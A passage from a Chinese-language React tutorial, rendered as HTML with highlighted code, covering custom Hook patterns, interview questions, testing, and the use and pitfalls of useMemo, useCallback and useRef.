class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 灵活的参数设计</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useToggle</span>(<span class="hljs-params">initial = <span class="hljs-literal">false</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initial);<br>  <br>  <span class="hljs-comment">// 支持直接设置或切换</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">toggle</span> = (<span class="hljs-params">value</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;boolean&#x27;</span>) &#123;<br>      <span class="hljs-title function_">setState</span>(value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-title function_">setState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> !prev);<br>    &#125;<br>  &#125;;<br>  <br>  <span class="hljs-comment">// 返回状态和控制方法</span><br>  <span class="hljs-keyword">return</span> [state, toggle];<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> [isOpen, toggleOpen] = <span class="hljs-title function_">useToggle</span>(<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p><strong>组合 Hook 模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 组合多个 Hook 创建复杂逻辑</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useUserProfile</span>(<span class="hljs-params">userId</span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, loading, error] = <span class="hljs-title function_">useFetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">$&#123;userId&#125;</span>`</span>);<br>  <span class="hljs-keyword">const</span> [preferences, setPrefs] = <span class="hljs-title function_">useLocalStorage</span>(<span class="hljs-string">`prefs_<span class="hljs-subst">$&#123;userId&#125;</span>`</span>, &#123;&#125;);<br>  <span class="hljs-keyword">const</span> [notifications, addNotification] = <span class="hljs-title function_">useNotifications</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    user,<br>    preferences,<br>    <span class="hljs-attr">setPreferences</span>: setPrefs,<br>    notifications,<br>    addNotification,<br>    loading,<br>    error<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>依赖注入模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建可配置的自定义 Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAPI</span>(<span class="hljs-params">endpoint, options = &#123;&#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-keyword">const</span> fetchData = <span class="hljs-title function_">useCallback</span>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, options);<br>      <span class="hljs-title function_">setData</span>(<span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>());<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);<br>    &#125;<br>  &#125;, [endpoint, options]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">fetchData</span>();<br>  &#125;, [fetchData]);<br>  <br>  <span class="hljs-keyword">return</span> &#123; data, loading, <span class="hljs-attr">refetch</span>: fetchData &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> userAPI = <span class="hljs-title function_">useAPI</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, &#123; <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-10"><a href="#高频面试题与破解方案-10" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：自定义 Hook 和 HOC（高阶组件）&#x2F;Render Props 有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">自定义 Hook</th><th align="left">HOC</th><th align="left">Render Props</th></tr></thead><tbody><tr><td align="left">逻辑复用方式</td><td align="left">直接调用 Hook</td><td align="left">包装组件</td><td align="left">通过 props 渲染</td></tr><tr><td align="left">组件层级</td><td align="left">无额外层级</td><td align="left">增加包装层级</td><td align="left">增加回调层级</td></tr><tr><td align="left">命名冲突</td><td align="left">无</td><td align="left">可能发生</td><td align="left">可能发生</td></tr><tr><td align="left">调试难度</td><td align="left">简单</td><td align="left">组件树变深</td><td align="left">回调嵌套复杂</td></tr><tr><td align="left">TypeScript 支持</td><td align="left">优秀</td><td align="left">类型推导复杂</td><td align="left">类型推导中等</td></tr></tbody></table><p>结论：<br>自定义 Hook 是 React 官方推荐的逻辑复用方案，解决了 HOC 和 Render Props 的嵌套问题</p><p><strong>Q：如何测试自定义 Hook？</strong></p><p>测试策略：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 @testing-library/react-hooks</span><br><span class="hljs-keyword">import</span> &#123; renderHook, act &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@testing-library/react-hooks&#x27;</span>;<br><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;should use counter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; result &#125; = <span class="hljs-title function_">renderHook</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">useCounter</span>());<br>  <br>  <span class="hljs-title function_">expect</span>(result.<span class="hljs-property">current</span>[<span class="hljs-number">0</span>]).<span class="hljs-title function_">toBe</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 初始值</span><br>  <br>  <span class="hljs-title function_">act</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    result.<span class="hljs-property">current</span>[<span class="hljs-number">1</span>](); <span class="hljs-comment">// 执行 increment</span><br>  &#125;);<br>  <br>  <span class="hljs-title function_">expect</span>(result.<span class="hljs-property">current</span>[<span class="hljs-number">0</span>]).<span class="hljs-title function_">toBe</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 更新后值</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Q：自定义 Hook 会导致内存泄漏吗？</strong></p><p>风险与防范：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useEventListener</span>(<span class="hljs-params">eventName, handler, element = <span class="hljs-variable language_">window</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> savedHandler = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-comment">// 保存最新处理函数</span><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    savedHandler.<span class="hljs-property">current</span> = handler;<br>  &#125;, [handler]);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">eventListener</span> = event =&gt; savedHandler.<span class="hljs-title function_">current</span>(event);<br>    element.<span class="hljs-title function_">addEventListener</span>(eventName, eventListener);<br>    <br>    <span class="hljs-comment">// ✅ 必须返回清理函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> element.<span class="hljs-title function_">removeEventListener</span>(eventName, eventListener);<br>  &#125;, [eventName, element]); <span class="hljs-comment">// 依赖变化时重新绑定</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h3><p><strong>权限控制 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">usePermission</span>(<span class="hljs-params">requiredPermission</span>) &#123;<br>  <span class="hljs-keyword">const</span> [user] = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">const</span> [hasPermission, setHasPermission] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span>;<br>    <br>    <span class="hljs-comment">// 异步检查权限（如调用API）</span><br>    <span class="hljs-title function_">checkPermission</span>(user.<span class="hljs-property">id</span>, requiredPermission).<span class="hljs-title function_">then</span>(setHasPermission);<br>  &#125;, [user, requiredPermission]);<br>  <br>  <span class="hljs-keyword">return</span> hasPermission;<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPanel</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> canEdit = <span class="hljs-title function_">usePermission</span>(<span class="hljs-string">&#x27;admin_edit&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> canEdit ? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Editor</span> /&gt;</span></span> : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">PermissionDenied</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态机 Hook</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useStateMachine</span>(<span class="hljs-params">states, initialState</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(initialState);<br>  <br>  <span class="hljs-keyword">const</span> transition = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> currentState = state;<br>    <span class="hljs-keyword">const</span> nextState = states[currentState]?.[event];<br>    <br>    <span class="hljs-keyword">if</span> (!nextState) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无效转换: <span class="hljs-subst">$&#123;currentState&#125;</span> -&gt; <span class="hljs-subst">$&#123;event&#125;</span>`</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-title function_">setState</span>(nextState);<br>  &#125;, [state, states]);<br>  <br>  <span class="hljs-keyword">return</span> [state, transition];<br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> [state, transition] = <span class="hljs-title function_">useStateMachine</span>(&#123;<br>  <span class="hljs-attr">idle</span>: &#123; <span class="hljs-attr">START</span>: <span class="hljs-string">&#x27;running&#x27;</span> &#125;,<br>  <span class="hljs-attr">running</span>: &#123; <span class="hljs-attr">PAUSE</span>: <span class="hljs-string">&#x27;paused&#x27;</span>, <span class="hljs-attr">COMPLETE</span>: <span class="hljs-string">&#x27;done&#x27;</span> &#125;,<br>  <span class="hljs-attr">paused</span>: &#123; <span class="hljs-attr">RESUME</span>: <span class="hljs-string">&#x27;running&#x27;</span>, <span class="hljs-attr">CANCEL</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;,<br>  <span class="hljs-attr">done</span>: &#123; <span class="hljs-attr">RESET</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;<br>&#125;, <span class="hljs-string">&#x27;idle&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="自定义-Hook-设计原则"><a href="#自定义-Hook-设计原则" class="headerlink" title="自定义 Hook 设计原则"></a>自定义 Hook 设计原则</h3><ol><li>单一职责：一个 Hook 只解决一个问题</li><li>命名清晰：use + 功能名（useWindowSize）</li><li>参数合理：提供默认值和必要配置</li><li>返回简洁：返回数组或对象结构</li><li>文档完善：使用 JSDoc 说明用法</li><li>类型安全：TypeScript 类型定义</li></ol><h3 id="总结：自定义-Hook-价值"><a href="#总结：自定义-Hook-价值" class="headerlink" title="总结：自定义 Hook 价值"></a>总结：自定义 Hook 价值</h3><pre class="mermaid">graph TD  A[逻辑复用] --> B[减少代码重复]  A --> C[统一业务逻辑]  D[关注点分离] --> E[提升可维护性]  D --> F[便于单元测试]  G[组件简化] --> H[提升可读性]  G --> I[降低复杂度]</pre><h2 id="3-6-其他常用-Hooks（useMemo、useCallback、useRef）"><a href="#3-6-其他常用-Hooks（useMemo、useCallback、useRef）" class="headerlink" title="3.6 其他常用 Hooks（useMemo、useCallback、useRef）"></a>3.6 其他常用 Hooks（useMemo、useCallback、useRef）</h2><h3 id="三大-Hook-快速对比"><a href="#三大-Hook-快速对比" class="headerlink" title="三大 Hook 快速对比"></a>三大 Hook 快速对比</h3><table><thead><tr><th align="left">Hook</th><th align="left">主要作用</th><th align="left">返回值</th><th align="left">性能优化原理</th></tr></thead><tbody><tr><td align="left">useMemo</td><td align="left">缓存计算结果</td><td align="left">记忆化值</td><td align="left">避免重复计算</td></tr><tr><td align="left">useCallback</td><td align="left">缓存函数引用</td><td align="left">记忆化函数</td><td align="left">避免子组件不必要重渲染</td></tr><tr><td align="left">useRef</td><td align="left">保存可变值&#x2F;DOM 引用</td><td align="left">{ current: value }</td><td align="left">不触发重渲染</td></tr></tbody></table><h3 id="useMemo-深度解析"><a href="#useMemo-深度解析" class="headerlink" title="useMemo 深度解析"></a>useMemo 深度解析</h3><p><strong>核心语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> memoizedValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b), [a, b]);<br></code></pre></td></tr></table></figure><ul><li>计算函数：返回需要缓存的值</li><li>依赖数组：当依赖变化时重新计算</li></ul><p><strong>工作原理</strong></p><pre class="mermaid">graph LR  A[组件渲染] --> B{依赖是否变化?}  B -->|否| C[返回缓存值]  B -->|是| D[执行计算函数]  D --> E[缓存新值]  E --> F[返回新值]</pre><p><strong>使用场景</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 场景1：高开销计算</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params">&#123; items &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> sortedItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a.<span class="hljs-property">value</span> - b.<span class="hljs-property">value</span>); <span class="hljs-comment">// 排序开销大</span><br>  &#125;, [items]);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">items</span>=<span class="hljs-string">&#123;sortedItems&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-comment">// 场景2：避免不必要重渲染</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> userContext = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; <br>    user, <br>    <span class="hljs-attr">isAdmin</span>: user.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span> <br>  &#125;), [user]); <span class="hljs-comment">// 依赖变化时重建</span><br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">context</span>=<span class="hljs-string">&#123;userContext&#125;</span> /&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>错误用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误1：没有依赖数组（每次渲染都计算）</span><br><span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">compute</span>());<br><br><span class="hljs-comment">// ❌ 错误2：依赖数组不全</span><br><span class="hljs-keyword">const</span> fullName = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;name&#125;</span> <span class="hljs-subst">$&#123;surname&#125;</span>`</span>, [name]);<br></code></pre></td></tr></table></figure><h3 id="useCallback-深度解析"><a href="#useCallback-深度解析" class="headerlink" title="useCallback 深度解析"></a>useCallback 深度解析</h3><p><strong>核心语法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">doSomething</span>(a, b);<br>&#125;, [a, b]);<br></code></pre></td></tr></table></figure><p><strong>与 useMemo 关系</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// useCallback 等价于：</span><br><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">doSomething</span>(a, b), [a, b]);<br></code></pre></td></tr></table></figure><p><strong>使用场景</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 场景1：避免子组件不必要重渲染</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// ✅ 稳定函数引用</span><br>  <span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>), []);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment&#125;</span> /&gt;</span></span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Child</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; onClick &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 依赖稳定函数引用不会重渲染</span><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClick&#125;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;);<br><br><span class="hljs-comment">// 场景2：依赖数组中的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [text, setText] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <br>  <span class="hljs-keyword">const</span> handleSubmit = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;提交:&#x27;</span>, text);<br>  &#125;, [text]); <span class="hljs-comment">// 正确捕获最新text</span><br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">keyHandler</span> = e =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">&#x27;Enter&#x27;</span>) <span class="hljs-title function_">handleSubmit</span>();<br>    &#125;;<br>    <br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, keyHandler);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, keyHandler);<br>  &#125;, [handleSubmit]); <span class="hljs-comment">// 依赖稳定函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能陷阱</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 错误：过度使用 useCallback</span><br><span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;点击&#x27;</span>);<br>&#125;, []); <span class="hljs-comment">// 简单函数不需要缓存</span><br><br><span class="hljs-comment">// ✅ 正确：直接定义函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;点击&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="useRef-高级用法（补充-2-5-章节）"><a href="#useRef-高级用法（补充-2-5-章节）" class="headerlink" title="useRef 高级用法（补充 2.5 章节）"></a>useRef 高级用法（补充 2.5 章节）</h3><p><strong>保存可变值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Timer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// &#123; current: 0 &#125;</span><br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    countRef.<span class="hljs-property">current</span> += <span class="hljs-number">1</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;计数:&#x27;</span>, countRef.<span class="hljs-property">current</span>);<br>  &#125;;<br>  <br>  <span class="hljs-comment">// 不触发重渲染！</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>访问上一状态</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">const</span> prevCountRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    prevCountRef.<span class="hljs-property">current</span> = count; <span class="hljs-comment">// 渲染后保存当前值</span><br>  &#125;);<br>  <br>  <span class="hljs-keyword">const</span> prevCount = prevCountRef.<span class="hljs-property">current</span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      当前: &#123;count&#125;, 之前: &#123;prevCount&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>跨渲染周期存储</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatRoom</span>(<span class="hljs-params"></span>) &#123;<br>  